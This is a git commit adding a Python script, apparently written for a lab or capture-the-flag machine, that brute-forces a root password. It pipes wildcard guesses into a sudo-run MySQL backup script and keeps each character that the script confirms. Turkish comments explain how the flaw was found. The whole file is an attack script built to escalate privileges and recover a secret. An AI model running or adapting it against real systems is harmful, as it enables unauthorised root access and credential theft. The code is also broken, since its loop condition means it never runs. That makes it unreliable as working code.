16a91b02541c5af4e9fa90aa2472ba24d69a9dd9
Can Kadioglu <84996018+cankadioglu@users.noreply.github.com>
2024-01-27 17:25:18 +0300

    Create brute.py

---
+++ brute.py
@@ -0,0 +1,20 @@
+import string
+import subprocess
+import pty
+total = list(string.ascii_letters + string.digits)
+a = 0
+password = ""
+while a!=0:
+	for t in total:
+		cmd = f"echo {password}{t}* | sudo /opt/scripts/mysql-backup.sh"
+		#pty.spawn(cmd)
+		#subprocess.call([cmd]) 
+		output = subprocess.run(cmd,stdout=True,shell=True,stderr=subprocess.PIPE,text=True).stdout # sifre girerken ilk harfi k girdigimde kabul etti k disinda hic biseyi kabul etmedi buradan
+# anlasiliyo k dan sonra hangi harfi confirm ederse sifreye ekliyor.
+		if "Password confirmed!" in output:
+			password += t
+			print (password)
+			break	
+		else:
+			continue
+	
